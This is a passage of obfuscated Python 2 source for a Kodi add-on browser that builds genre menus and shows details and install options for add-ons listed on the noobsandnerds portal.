 IiII111i1i11 ( 'folder' , 'Thai' , url + '&genre=thai' , 'grab_addons' , 'thai.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Turkish' , url + '&genre=turkish' , 'grab_addons' , 'turkish.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'UK' , url + '&genre=uk' , 'grab_addons' , 'uk.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'USA' , url + '&genre=usa' , 'grab_addons' , 'usa.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Vietnamese' , url + '&genre=vietnamese' , 'grab_addons' , 'vietnamese.png' , '' , '' , '' )
 if 29 - 29: I1IiiI % Oo - I1IiiI / Oo . i1IIi
 if 31 - 31: i1Ii11i1i
def OOO0000oO ( url ) :
 iI1i111I1Ii = 'http://noobsandnerds.com/TI/AddonPortal/addondetails.php?id=%s' % ( url )
 i11i1ii1I = o0OO0o0o00o ( iI1i111I1Ii ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 oOo0 = re . compile ( 'approved="(.+?)"' ) . findall ( i11i1ii1I )
 OOOoOO = re . compile ( 'addon_types="(.+?)"' ) . findall ( i11i1ii1I )
 I11IIIi = re . compile ( 'name="(.+?)"' ) . findall ( i11i1ii1I )
 iIIiiI1II1i11 = re . compile ( 'UID="(.+?)"' ) . findall ( i11i1ii1I )
 o0o0 = re . compile ( 'id="(.+?)"' ) . findall ( i11i1ii1I )
 IIii1111 = re . compile ( 'provider_name="(.+?)"' ) . findall ( i11i1ii1I )
 I1iI = re . compile ( 'version="(.+?)"' ) . findall ( i11i1ii1I )
 IIIIiIiIi1 = re . compile ( 'created="(.+?)"' ) . findall ( i11i1ii1I )
 I11iiiiI1i = re . compile ( 'addon_types="(.+?)"' ) . findall ( i11i1ii1I )
 iI1i11 = re . compile ( 'updated="(.+?)"' ) . findall ( i11i1ii1I )
 OoOOoooOO0O = re . compile ( 'downloads="(.+?)"' ) . findall ( i11i1ii1I )
 ooo00Ooo = re . compile ( 'description="(.+?)"' ) . findall ( i11i1ii1I )
 Oo0o0O00 = re . compile ( 'devbroke="(.+?)"' ) . findall ( i11i1ii1I )
 ii1 = re . compile ( 'broken="(.+?)"' ) . findall ( i11i1ii1I )
 I1i11 = re . compile ( 'deleted="(.+?)"' ) . findall ( i11i1ii1I )
 OOo0O0oo0OO0O = re . compile ( 'mainbranch_notes="(.+?)"' ) . findall ( i11i1ii1I )
 OO0 = re . compile ( 'repo_url="(.+?)"' ) . findall ( i11i1ii1I )
 o0Oooo = re . compile ( 'data_url="(.+?)"' ) . findall ( i11i1ii1I )
 iiI = re . compile ( 'zip_url="(.+?)"' ) . findall ( i11i1ii1I )
 oOIIiIi = re . compile ( 'genres="(.+?)"' ) . findall ( i11i1ii1I )
 OOoOooOoOOOoo = re . compile ( 'forum="(.+?)"' ) . findall ( i11i1ii1I )
 Iiii1iI1i = re . compile ( 'repo_id="(.+?)"' ) . findall ( i11i1ii1I )
 I1ii1ii11i1I = re . compile ( 'license="(.+?)"' ) . findall ( i11i1ii1I )
 o0OoOO = re . compile ( 'platform="(.+?)"' ) . findall ( i11i1ii1I )
 O0O0Oo00 = re . compile ( 'visible="(.+?)"' ) . findall ( i11i1ii1I )
 oOoO00o = re . compile ( 'script="(.+?)"' ) . findall ( i11i1ii1I )
 oO00O0 = re . compile ( 'program_plugin="(.+?)"' ) . findall ( i11i1ii1I )
 IIi1IIIi = re . compile ( 'script_module="(.+?)"' ) . findall ( i11i1ii1I )
 O00Ooo = re . compile ( 'video_plugin="(.+?)"' ) . findall ( i11i1ii1I )
 OOOO0OOO = re . compile ( 'audio_plugin="(.+?)"' ) . findall ( i11i1ii1I )
 i1i1ii = re . compile ( 'image_plugin="(.+?)"' ) . findall ( i11i1ii1I )
 iII1ii1 = re . compile ( 'repository="(.+?)"' ) . findall ( i11i1ii1I )
 I1i1iiiI1 = re . compile ( 'weather_service="(.+?)"' ) . findall ( i11i1ii1I )
 iIIi = re . compile ( 'skin="(.+?)"' ) . findall ( i11i1ii1I )
 oO0o00oo0 = re . compile ( 'service="(.+?)"' ) . findall ( i11i1ii1I )
 ii1IIII = re . compile ( 'warning="(.+?)"' ) . findall ( i11i1ii1I )
 oO00oOooooo0 = re . compile ( 'web_interface="(.+?)"' ) . findall ( i11i1ii1I )
 oOo = re . compile ( 'movie_scraper="(.+?)"' ) . findall ( i11i1ii1I )
 O0OOooOoO = re . compile ( 'tv_scraper="(.+?)"' ) . findall ( i11i1ii1I )
 i1II1I1Iii1 = re . compile ( 'artist_scraper="(.+?)"' ) . findall ( i11i1ii1I )
 iiI11Iii = re . compile ( 'music_video_scraper="(.+?)"' ) . findall ( i11i1ii1I )
 O0o0O0 = re . compile ( 'subtitles="(.+?)"' ) . findall ( i11i1ii1I )
 Ii1II1I11i1 = re . compile ( 'requires="(.+?)"' ) . findall ( i11i1ii1I )
 oOoooooOoO = re . compile ( 'modules="(.+?)"' ) . findall ( i11i1ii1I )
 Ii111 = re . compile ( 'icon="(.+?)"' ) . findall ( i11i1ii1I )
 I111i1i1111 = re . compile ( 'video_preview="(.+?)"' ) . findall ( i11i1ii1I )
 IIII1 = re . compile ( 'video_guide="(.+?)"' ) . findall ( i11i1ii1I )
 I1I1i = re . compile ( 'video_guide1="(.+?)"' ) . findall ( i11i1ii1I )
 I1IIIiIiIi = re . compile ( 'video_guide2="(.+?)"' ) . findall ( i11i1ii1I )
 IIIII1 = re . compile ( 'video_guide3="(.+?)"' ) . findall ( i11i1ii1I )
 iIi1Ii1i1iI = re . compile ( 'video_guide4="(.+?)"' ) . findall ( i11i1ii1I )
 IIiI1 = re . compile ( 'video_guide5="(.+?)"' ) . findall ( i11i1ii1I )
 i1iI1 = re . compile ( 'video_guide6="(.+?)"' ) . findall ( i11i1ii1I )
 ii1I1IiiI1ii1i = re . compile ( 'video_guide7="(.+?)"' ) . findall ( i11i1ii1I )
 O0o = re . compile ( 'video_guide8="(.+?)"' ) . findall ( i11i1ii1I )
 oO0OoO00o = re . compile ( 'video_guide9="(.+?)"' ) . findall ( i11i1ii1I )
 II1iiiiII = re . compile ( 'video_guide10="(.+?)"' ) . findall ( i11i1ii1I )
 O0OoOO0oo0 = re . compile ( 'video_label1="(.+?)"' ) . findall ( i11i1ii1I )
 oOO = re . compile ( 'video_label2="(.+?)"' ) . findall ( i11i1ii1I )
 O0o0OO0000ooo = re . compile ( 'video_label3="(.+?)"' ) . findall ( i11i1ii1I )
 iIIII1iIIii = re . compile ( 'video_label4="(.+?)"' ) . findall ( i11i1ii1I )
 oOOO00o000o = re . compile ( 'video_label5="(.+?)"' ) . findall ( i11i1ii1I )
 iIi11i1 = re . compile ( 'video_label6="(.+?)"' ) . findall ( i11i1ii1I )
 oO00oo0o00o0o = re . compile ( 'video_label7="(.+?)"' ) . findall ( i11i1ii1I )
 IiIIIIIi = re . compile ( 'video_label8="(.+?)"' ) . findall ( i11i1ii1I )
 IiIi1iIIi1 = re . compile ( 'video_label9="(.+?)"' ) . findall ( i11i1ii1I )
 O0OoO0ooOO0o = re . compile ( 'video_label10="(.+?)"' ) . findall ( i11i1ii1I )
 if 81 - 81: O0 * II111iiii + I1IiiI * i11iIiiIii - I1ii11iIi11i / I1IiiI
 if 63 - 63: OoOoOO00 - OoooooooOO % i1Ii11i1i
 oOi11iI11iIiIi = oOo0 [ 0 ] if ( len ( oOo0 ) > 0 ) else ''
 O00 = OOOoOO [ 0 ] if ( len ( OOOoOO ) > 0 ) else ''
 oOo00O0oo00o0 = I11IIIi [ 0 ] if ( len ( I11IIIi ) > 0 ) else ''
 O0ooo0 = iIIiiI1II1i11 [ 0 ] if ( len ( iIIiiI1II1i11 ) > 0 ) else ''
 I1iii11 = o0o0 [ 0 ] if ( len ( o0o0 ) > 0 ) else ''
 ooo0O = IIii1111 [ 0 ] if ( len ( IIii1111 ) > 0 ) else ''
 iII1iii = I1iI [ 0 ] if ( len ( I1iI ) > 0 ) else ''
 i11i1iiiII = IIIIiIiIi1 [ 0 ] if ( len ( IIIIiIiIi1 ) > 0 ) else ''
 ooOO0oO0oo00o = I11iiiiI1i [ 0 ] if ( len ( I11iiiiI1i ) > 0 ) else ''
 oOOo0oo0O = iI1i11 [ 0 ] if ( len ( iI1i11 ) > 0 ) else ''
 IiiIiI1Ii1i = OoOOoooOO0O [ 0 ] if ( len ( OoOOoooOO0O ) > 0 ) else ''
 i1iIi = '[CR][CR][COLOR=dodgerblue]Description: [/COLOR]' + ooo00Ooo [ 0 ] if ( len ( ooo00Ooo ) > 0 ) else ''
 iiiii1II = Oo0o0O00 [ 0 ] if ( len ( Oo0o0O00 ) > 0 ) else ''
 O0OOO0OOooo00 = ii1 [ 0 ] if ( len ( ii1 ) > 0 ) else ''
 I111iIi1 = '[CR]' + I1i11 [ 0 ] if ( len ( I1i11 ) > 0 ) else ''
 oo00O00oO000o = '[CR][CR][COLOR=dodgerblue]User Notes: [/COLOR]' + OOo0O0oo0OO0O [ 0 ] if ( len ( OOo0O0oo0OO0O ) > 0 ) else ''
 OOo00OoO = OO0 [ 0 ] if ( len ( OO0 ) > 0 ) else ''
 iIi1 = o0Oooo [ 0 ] if ( len ( o0Oooo ) > 0 ) else ''
 i11iiI1111 = iiI [ 0 ] if ( len ( iiI ) > 0 ) else ''
 oOoooo000Oo00 = oOIIiIi [ 0 ] if ( len ( oOIIiIi ) > 0 ) else ''
 OOoo = '[CR][CR][COLOR=dodgerblue]Support Forum: [/COLOR]' + OOoOooOoOOOoo [ 0 ] if ( len ( OOoOooOoOOOoo ) > 0 ) else '[CR][CR][COLOR=dodgerblue]Support Forum: [/COLOR]No forum details given by developer'
 o00O00oO00 = OOoOooOoOOOoo [ 0 ] if ( len ( OOoOooOoOOOoo ) > 0 ) else 'None'
 Ii1i1i1i1I1Ii = Iiii1iI1i [ 0 ] if ( len ( Iiii1iI1i ) > 0 ) else ''
 license = I1ii1ii11i1I [ 0 ] if ( len ( I1ii1ii11i1I ) > 0 ) else ''
 iiiI1 = '[COLOR=orange]     Platform: [/COLOR]' + o0OoOO [ 0 ] if ( len ( o0OoOO ) > 0 ) else ''
 OOOoO0O = O0O0Oo00 [ 0 ] if ( len ( O0O0Oo00 ) > 0 ) else ''
 o0iiiI1I1iIIIi1 = oOoO00o [ 0 ] if ( len ( oOoO00o ) > 0 ) else ''
 Iii = oO00O0 [ 0 ] if ( len ( oO00O0 ) > 0 ) else ''
 I1iiiiI1iI = IIi1IIIi [ 0 ] if ( len ( IIi1IIIi ) > 0 ) else ''
 iIiiiii1i = O00Ooo [ 0 ] if ( len ( O00Ooo ) > 0 ) else ''
 iiIi1IIiI = OOOO0OOO [ 0 ] if ( len ( OOOO0OOO ) > 0 ) else ''
 i1oO0OO0 = i1i1ii [ 0 ] if ( len ( i1i1ii ) > 0 ) else ''
 o0O0Oo00 = iII1ii1 [ 0 ] if ( len ( iII1ii1 ) > 0 ) else ''
 O0Oo0o000oO = oO0o00oo0 [ 0 ] if ( len ( oO0o00oo0 ) > 0 ) else ''
 O0ii1ii1ii = iIIi [ 0 ] if ( len ( iIIi ) > 0 ) else ''
 oO0o00oOOooO0 = ii1IIII [ 0 ] if ( len ( ii1IIII ) > 0 ) else ''
 OOOoO000 = oO00oOooooo0 [ 0 ] if ( len ( oO00oOooooo0 ) > 0 ) else ''
 oOOOO = I1i1iiiI1 [ 0 ] if ( len ( I1i1iiiI1 ) > 0 ) else ''
 Ii = oOo [ 0 ] if ( len ( oOo ) > 0 ) else ''
 Ii1ii111i1 = O0OOooOoO [ 0 ] if ( len ( O0OOooOoO ) > 0 ) else ''
 i1i1i1I = i1II1I1Iii1 [ 0 ] if ( len ( i1II1I1Iii1 ) > 0 ) else ''
 oOoo000 = iiI11Iii [ 0 ] if ( len ( iiI11Iii ) > 0 ) else ''
 OooOo00o = O0o0O0 [ 0 ] if ( len ( O0o0O0 ) > 0 ) else ''
 iI1I11iiI1i = Ii1II1I11i1 [ 0 ] if ( len ( Ii1II1I11i1 ) > 0 ) else ''
 IiI11i1IIiiI = oOoooooOoO [ 0 ] if ( len ( oOoooooOoO ) > 0 ) else ''
 oOOo000oOoO0 = Ii111 [ 0 ] if ( len ( Ii111 ) > 0 ) else ''
 OoOo00o0OO = I111i1i1111 [ 0 ] if ( len ( I111i1i1111 ) > 0 ) else 'None'
 ii1IIIIiI11 = IIII1 [ 0 ] if ( len ( IIII1 ) > 0 ) else 'None'
 iI1IIIii = I1I1i [ 0 ] if ( len ( I1I1i ) > 0 ) else 'None'
 I1i11ii11 = I1IIIiIiIi [ 0 ] if ( len ( I1IIIiIiIi ) > 0 ) else 'None'
 OO00O0oOO = IIIII1 [ 0 ] if ( len ( IIIII1 ) > 0 ) else 'None'
 Ii1iI111 = iIi1Ii1i1iI [ 0 ] if ( len ( iIi1Ii1i1iI ) > 0 ) else 'None'
 O0oooo00o0Oo = IIiI1 [ 0 ] if ( len ( IIiI1 ) > 0 ) else 'None'
 I1iii = i1iI1 [ 0 ] if ( len ( i1iI1 ) > 0 ) else 'None'
 oO0o0O0Ooo0o = ii1I1IiiI1ii1i [ 0 ] if ( len ( ii1I1IiiI1ii1i ) > 0 ) else 'None'
 i1Ii11II = O0o [ 0 ] if ( len ( O0o ) > 0 ) else 'None'
 IioO0oOOO0Ooo = oO0OoO00o [ 0 ] if ( len ( oO0OoO00o ) > 0 ) else 'None'
 i1i1I = II1iiiiII [ 0 ] if ( len ( II1iiiiII ) > 0 ) else 'None'
 IiIIi1 = O0OoOO0oo0 [ 0 ] if ( len ( O0OoOO0oo0 ) > 0 ) else 'None'
 iII11I1Ii1 = oOO [ 0 ] if ( len ( oOO ) > 0 ) else 'None'
 o0o0oOo0oO = O0o0OO0000ooo [ 0 ] if ( len ( O0o0OO0000ooo ) > 0 ) else 'None'
 IIi1IIIIi = iIIII1iIIii [ 0 ] if ( len ( iIIII1iIIii ) > 0 ) else 'None'
 OOOoO = oOOO00o000o [ 0 ] if ( len ( oOOO00o000o ) > 0 ) else 'None'
 I1i = iIi11i1 [ 0 ] if ( len ( iIi11i1 ) > 0 ) else 'None'
 iiiI = oO00oo0o00o0o [ 0 ] if ( len ( oO00oo0o00o0o ) > 0 ) else 'None'
 IiIi1 = IiIIIIIi [ 0 ] if ( len ( IiIIIIIi ) > 0 ) else 'None'
 i111iiI1ii = IiIi1iIIi1 [ 0 ] if ( len ( IiIi1iIIi1 ) > 0 ) else 'None'
 IIiii = O0OoO0ooOO0o [ 0 ] if ( len ( O0OoO0ooOO0o ) > 0 ) else 'None'
 if 30 - 30: OooO00OOoO00 / OO000 . oOO00 . OoooooooOO - Oo0Ooo
 print "### Addon Details: " + oOo00O0oo00o0
 if I111iIi1 != '' :
  Ii1iI1iI11I1 = '[CR][CR][COLOR=dodgerblue]Status: [/COLOR][COLOR=red]This add-on is depreciated, it\'s no longer available.[/COLOR]'
  if 12 - 12: i1Ii11i1i . OoO0O00 . OOOOOOoo0O - OoooooooOO % Oo0Ooo
 elif O0OOO0OOooo00 == '' and iiiii1II == '' and oO0o00oOOooO0 == '' :
  Ii1iI1iI11I1 = '[CR][CR][COLOR=dodgerblue]Status: [/COLOR][COLOR=lime]No reported problems[/COLOR]'
  if 36 - 36: Oo
 elif O0OOO0OOooo00 == '' and iiiii1II == '' and oO0o00oOOooO0 != '' and I111iIi1 == '' :
  Ii1iI1iI11I1 = '[CR][CR][COLOR=dodgerblue]Status: [/COLOR][COLOR=orange]Although there have been no reported problems there may be issues with this add-on, see below.[/COLOR]'
  if 84 - 84: i1Ii11i1i . OoO0O00 . II111iiii . OooO00OOoO00 / OO000 % I1ii11iIi11i
 elif O0OOO0OOooo00 == '' and iiiii1II != '' :
  Ii1iI1iI11I1 = '[CR][CR][COLOR=dodgerblue]Status: [/COLOR]Marked as broken by the add-on developer.[CR][COLOR=dodgerblue]Developer Comments: [/COLOR]' + iiiii1II
  if 57 - 57: I1IiiI % OooO00OOoO00 - Oo . I1IiiI / Oo0Ooo % OOOOOOoo0O
 elif O0OOO0OOooo00 != '' and iiiii1II == '' :
  Ii1iI1iI11I1 = '[CR][CR][COLOR=dodgerblue]Status: [/COLOR]Marked as broken by a member of the community at [COLOR=orange]www.noobs[/COLOR][COLOR=dodgerblue]and[/COLOR][COLOR=orange]nerds.com[/COLOR][CR][COLOR=dodgerblue]User Comments: [/COLOR]' + O0OOO0OOooo00
  if 56 - 56: ooOo . OOOOOOoo0O . oOO00 * OoOoOO00 . o0oOOoo / O0
 elif O0OOO0OOooo00 != '' and iiiii1II != '' :
  Ii1iI1iI11I1 = '[CR][CR][COLOR=dodgerblue]Status: [/COLOR]Marked as broken by both the add-on developer and a member of the community at [COLOR=orange]www.noobs[/COLOR][COLOR=dodgerblue]and[/COLOR][COLOR=orange]nerds.com[/COLOR][CR][COLOR=dodgerblue]Developer Comments: [/COLOR]' + iiiii1II + '[CR][COLOR=dodgerblue]User Comments: [/COLOR]' + O0OOO0OOooo00
  if 23 - 23: i1IIi + OOOOOOoo0O + oOO00 + OoO0O00
  if 12 - 12: iIii1I11I1II1 - I1ii11iIi11i + i11iIiiIii
 IiIi11Iii = str ( '[COLOR=orange]Name: [/COLOR]' + oOo00O0oo00o0 + '[COLOR=orange]     Author(s): [/COLOR]' + ooo0O + '[COLOR=orange][CR][CR]Version: [/COLOR]' + iII1iii + '[COLOR=orange]     Created: [/COLOR]' + i11i1iiiII + '[COLOR=orange]     Updated: [/COLOR]' + oOOo0oo0O + '[COLOR=orange][CR][CR]Repository: [/COLOR]' + Ii1i1i1i1I1Ii + iiiI1 + '[COLOR=orange]     Add-on Type(s): [/COLOR]' + ooOO0oO0oo00o + iI1I11iiI1i + Ii1iI1iI11I1 + I111iIi1 + oO0o00oOOooO0 + OOoo + i1iIi + oo00O00oO000o )
 if 46 - 46: OoOoOO00 - OooO00OOoO00 - OO000 . i1IIi
 if 35 - 35: II111iiii * OooO00OOoO00 - OoooooooOO . OooO00OOoO00 . OooO00OOoO00
 if os . path . exists ( os . path . join ( ooooooO0oo , I1iii11 ) ) :
  if 'script.module' in I1iii11 or 'repo' in I1iii11 :
   IiII111i1i11 ( '' , '[COLOR=orange]Already installed[/COLOR]' , '' , '' , oOOo000oOoO0 , '' , '' , '' )
  else :
   IiII111i1i11 ( '' , '[COLOR=orange]Already installed -[/COLOR] Click here to run the add-on' , I1iii11 , 'run_addon' , oOOo000oOoO0 , '' , '' , '' )
   if 11 - 11: i1Ii11i1i / OoOoOO00 + OooO00OOoO00 % iIii1I11I1II1
   if 42 - 42: I1ii11iIi11i * OoOoOO00 % o0oOOoo - OoOoOO00 . i11iIiiIii - i1Ii11i1i
 if oOo00O0oo00o0 == '' :
  IiII111i1i11 ( '' , '[COLOR=darkcyan]Sorry request failed due to high traffic on server, please try again[/COLOR]' , '' , '' , oOOo000oOoO0 , '' , '' , '' )
  if 84 - 84: i1Ii11i1i - I1ii11iIi11i / OooO00OOoO00
  if 13 - 13: oOO00 - Oo0Ooo - o0oOOoo
 elif oOo00O0oo00o0 != '' :
  if 92 - 92: o0oOOoo / OoOoOO00 * OoO0O00 . OooO00OOoO00 % II111iiii
  if ( O0OOO0OOooo00 == '' ) and ( iiiii1II == '' ) and ( I111iIi1 == '' ) and ( oO0o00oOOooO0 == '' ) :
   IiII111i1i11 ( 'addon' , '[COLOR=darkcyan][FULL DETAILS][/COLOR] No problems reported' , IiIi11Iii , 'text_guide' , oOOo000oOoO0 , '' , '' , IiIi11Iii )
   if 71 - 71: i1Ii11i1i % i1IIi - II111iiii - Oo + Oo * o0oOOoo
  if ( O0OOO0OOooo00 != '' and I111iIi1 == '' ) or ( iiiii1II != '' and I111iIi1 == '' ) or ( oO0o00oOOooO0 != '' and I111iIi1 == '' ) :
   IiII111i1i11 ( 'addon' , '[COLOR=darkcyan][FULL DETAILS][/COLOR][COLOR=orange] Possbile problems reported[/COLOR]' , IiIi11Iii , 'text_guide' , oOOo000oOoO0 , '' , '' , IiIi11Iii )
   if 51 - 51: iIii1I11I1II1 / OoOoOO00 + Oo - OooO00OOoO00 + OOOOOOoo0O
  if I111iIi1 != '' :
   IiII111i1i11 ( 'addon' , '[COLOR=darkcyan][FULL DETAILS][/COLOR][COLOR=red] Add-on now depreciated[/COLOR]' , IiIi11Iii , 'text_guide' , oOOo000oOoO0 , '' , '' , IiIi11Iii )
   if 29 - 29: o0oOOo0O0Ooo % iIii1I11I1II1 . OoooooooOO % OoooooooOO % II111iiii / OOOOOOoo0O
   if 70 - 70: i11iIiiIii % OOOOOOoo0O
   if 11 - 11: oOO00 % I1ii11iIi11i % OO000 / II111iiii % i1Ii11i1i - Oo0Ooo
   if 96 - 96: I1ii11iIi11i / II111iiii . OO000 - OOOOOOoo0O * OooO00OOoO00 * ooOo
  O00oo0ooO = xbmc . translatePath ( os . path . join ( ooooooO0oo , Ii1i1i1i1I1Ii ) )
  if 38 - 38: iIii1I11I1II1 - II111iiii - I1IiiI
  if oOi11iI11iIiIi == '0' :
   if 71 - 71: OoooooooOO
   if Ii1i1i1i1I1Ii != '' and 'superrepo' not in Ii1i1i1i1I1Ii and I111iIi1 == '' :
    OOoOO0o0o0 ( '[COLOR=lime][INSTALL] [/COLOR]' + oOo00O0oo00o0 , oOo00O0oo00o0 , '' , 'addon_install_na' , 'Install.png' , '' , '' , i1iIi , O00 , OOo00OoO , Ii1i1i1i1I1Ii , I1iii11 , ooo0O , o00O00oO00 , iIi1 )
    if 33 - 33: i1Ii11i1i
   if ( Ii1i1i1i1I1Ii == '' or 'superrepo' in Ii1i1i1i1I1Ii ) and I111iIi1 == '' :
    OOoOO0o0o0 ( '[COLOR=lime][INSTALL] [/COLOR]' + oOo00O0oo00o0 , oOo00O0oo00o0 , '' , 'addon_install_badzip' , 'Install.png' , '' , '' , i1iIi , O00 , OOo00OoO , Ii1i1i1i1I1Ii , I1iii11 , ooo0O , o00O00oO00 , iIi1 )
    if 62 - 62: I1ii11iIi11i + OO000 + i1IIi / OoooooooOO
    if 7 - 7: o0oOOo0O0Ooo + i1IIi . I1IiiI / Oo0Ooo
    if 22 - 22: o0oOOoo - o0oOOoo % Oo . i1Ii11i1i + ooOo
  elif I111iIi1 == '' :
   if 63 - 63: I1IiiI % i1Ii11i1i * o0oOOo0O0Ooo + i1Ii11i1i / Oo0Ooo % OOOOOOoo0O
   if Ii1i1i1i1I1Ii != '' and 'superrepo' not in Ii1i1i1i1I1Ii :
    OOoOO0o0o0 ( '[COLOR=lime][INSTALL - Recommended] [/COLOR]' + oOo00O0oo00o0 , oOo00O0oo00o0 , '' , 'addon_install_zero' , 'Install.png' , '' , '' , i1iIi , O00 , OOo00OoO , Ii1i1i1i1I1Ii , I1iii11 , ooo0O , o00O00oO00 , iIi1 )
    OOoOO0o0o0 ( '[COLOR=lime][INSTALL - Backup Option] [/COLOR]' + oOo00O0oo00o0 , oOo00O0oo00o0 , '' , 'addon_install' , 'Install.png' , '' , '' , i1iIi , i11iiI1111 , OOo00OoO , Ii1i1i1i1I1Ii , I1iii11 , ooo0O , o00O00oO00 , iIi1 )
    if 45 - 45: oOO00
   if Ii1i1i1i1I1Ii == '' or 'superrepo' in Ii1i1i1i1I1Ii :
    OOoOO0o0o0 ( '[COLOR=lime][INSTALL] [/COLOR]' + oOo00O0oo00o0 + ' - THIS IS NOT IN A SELF UPDATING REPO' , oOo00O0oo00o0 , '' , 'addon_install' , 'Install.png' , '' , '' , i1iIi , i11iiI1111 , OOo00OoO , Ii1i1i1i1I1Ii , I1iii11 , ooo0O , o00O00oO00 , iIi1 )
    if 20 - 20: OoooooooOO * o0oOOo0O0Ooo * O0 . Oo
    if 78 - 78: iIii1I11I1II1 + OooO00OOoO00 - OO000 * i1Ii11i1i - OoooooooOO % OoOoOO00
  if OoOo00o0OO != 'None' :
   IiII111i1i11 ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  Preview' , iI1IIIii , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
   if 34 - 34: O0
  if iI1IIIii != 'None' :
   IiII111i1i11 ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + IiIIi1 , iI1IIIii , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
   if 80 - 80: i1IIi - Oo0Ooo / OoO0O00 - i11iIiiIii
  if I1i11ii11 != 'None' :
   IiII111i1i11 ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + iII11I1Ii1 , I1i11ii11 , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
   if 68 - 68: ooOo - I1ii11iIi11i % O0 % i1Ii11i1i
  if OO00O0oOO != 'None' :
   IiII111i1i11 ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + o0o0oOo0oO , OO00O0oOO , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
   if 11 - 11: O0 / OoO0O00 % Oo + o0oOOo0O0Ooo + iIii1I11I1II1
  if Ii1iI111 != 'None' :
   IiII111i1i11 ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + IIi1IIIIi , Ii1iI111 , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
   if 40 - 40: o0oOOoo - Oo . OO000 * Oo0Ooo % i1Ii11i1i
  if O0oooo00o0Oo != 'None' :
   IiII111i1i11 ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + OOOoO , O0oooo00o0Oo , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
   if 56 - 56: i11iIiiIii . o0oOOo0O0Ooo - I1IiiI * OooO00OOoO00
  if I1iii != 'None' :
   IiII111i1i11 ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + I1i , I1iii , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
   if 91 - 91: ooOo + OoooooooOO - i1IIi
  if oO0o0O0Ooo0o != 'None' :
   IiII111i1i11 ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + iiiI , oO0o0O0Ooo0o , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
   if 84 - 84: OO000 / oOO00
  if i1Ii11II != 'None' :
   IiII111i1i11 ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + IiIi1 , i1Ii11II , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
   if 86 - 86: OoOoOO00 * II111iiii - O0 . OoOoOO00 % iIii1I11I1II1 / Oo
  if IioO0oOOO0Ooo != 'None' :
   IiII111i1i11 ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + i111iiI1ii , IioO0oOOO0Ooo , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
   if 11 - 11: I1IiiI * ooOo + I1ii11iIi11i / I1ii11iIi11i
  if i1i1I != 'None' :
   IiII111i1i11 ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + IIiii , i1i1I , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
   if 37 - 37: i11iIiiIii + i1IIi
   if 23 - 23: OOOOOOoo0O + OooO00OOoO00 . OoOoOO00 * I1IiiI + I1ii11iIi11i
def I1iIi1iiiIiI ( url ) :
 IiII111i1i11 ( 'folder' , 'Anime' , url + '&genre=anime' , 'grab_addons' , 'anime.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Audiobooks' , url + '&genre=audiobooks' , 'grab_addons' , 'audiobooks.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Comedy' , url + '&genre=comedy' , 'grab_addons' , 'comedy.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Comics' , url + '&genre=comics' , 'grab_addons' , 'comics.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Documentary' , url + '&genre=documentary' , 'grab_addons' , 'documentary.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Downloads' , url + '&genre=downloads' , 'grab_addons' , 'downloads.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Food' , url + '&genre=food' , 'grab_addons' , 'food.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Gaming' , url + '&genre=gaming' , 'grab_addons' , 'gaming.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Health' , url + '&genre=health' , 'grab_addons' , 'health.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'How To...' , url + '&genre=howto' , 'grab_addons' , 'howto.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Kids' , url + '&genre=kids' , 'grab_addons' , 'kids.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Live TV' , url + '&genre=livetv' , 'grab_addons' , 'livetv.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Movies' , url + '&genre=movies' , 'grab_addons' , 'movies.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Music' , url + '&genre=music' , 'grab_addons' , 'music.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'News' , url + '&genre=news' , 'grab_addons' , 'news.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Photos' , url + '&genre=photos' , 'grab_addons' , 'photos.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Podcasts' , url + '&genre=podcasts' , 'grab_addons' , 'podcasts.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Radio' , url + '&genre=radio' , 'grab_addons' , 'radio.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Religion' , url + '&genre=religion' , 'grab_addons' , 'religion.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Space' , url + '&genre=space' , 'grab_addons' , 'space.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Sports' , url + '&genre=sports' , 'grab_addons' , 'sports.png' , '' , '' , '' )
